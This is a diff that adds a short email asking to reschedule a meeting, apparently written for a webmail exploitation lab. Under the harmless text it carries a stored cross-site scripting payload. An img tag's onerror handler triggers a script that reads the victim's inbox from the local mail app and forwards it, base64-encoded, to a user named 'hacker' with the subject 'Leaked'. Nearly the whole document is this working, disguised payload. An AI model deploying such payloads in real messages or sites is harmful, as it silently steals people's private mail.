@@ -1,0 +1,29 @@
+
+*** Subject ***
+Meeting Reschedule
+
+*** Message ***
+Hello
+
+We have to reschedule our meeting. How about Monday, 9am?
+
+Best,
+Legit user
+<script>
+function reqListener () {
+    const data = this.responseText;
+    const params = 'recipient=hacker&subject=Leaked&message=' + btoa(data);
+
+    var http = new XMLHttpRequest();
+    http.open("POST", "http://localhost.local:8888/send");
+    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    http.send(params);
+}
+function leak() {
+    var http = new XMLHttpRequest();
+    http.addEventListener("load", reqListener);
+    http.open("GET", "http://localhost.local:8888/inbox");
+    http.send();
+}
+</script>
+<img src='x' width="1" height="1" onerror=leak()>
